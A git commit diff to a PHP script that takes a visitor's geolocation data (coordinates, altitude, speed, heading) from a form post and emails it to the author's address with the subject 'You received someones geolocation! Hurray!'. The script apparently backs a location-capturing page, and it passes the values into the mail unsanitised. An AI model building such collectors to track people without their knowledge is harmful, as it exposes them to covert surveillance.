b1c5734fa5869a1d41da54b1d6bdf5b36926a188
Samuel Vandak <48286115+NomDeiX@users.noreply.github.com>
2020-04-29 15:11:54 +0200

    Update postphpmail.php

--- postphpmail.php
+++ postphpmail.php
@@ -2,8 +2,23 @@
 
 $latitude = $_POST["latitude"];
 $longitude = $_POST["longitude"];
+$accuracy = $_POST["accuracy"];
+$altitude = $_POST["altitude"];
+$altitudeaccuracy = $_POST["altitudeaccuracy"];
+$speed = $_POST["speed"];
+$heading = $_POST["heading"];
+$timestamp = $_POST["timestamp"];
 
-echo $latitude
+echo "a";
 
-mail("samuelvandak@gmail.com","You received someones geolocation! Hurray!","test");
+mail("samuelvandak@gmail.com","You received someones geolocation! Hurray!","The latitude is: $latitude
+\n The longitude is $longitude
+\n The accuracy of your query is $accuracy
+\n The altitude is $altitude
+\n The altitude accuracy of your query is $altitudeaccuracy
+\n The speed is $speed
+\n The heading is $heading
+\n The timestamp is $timestamp
+"
+);
 ?>
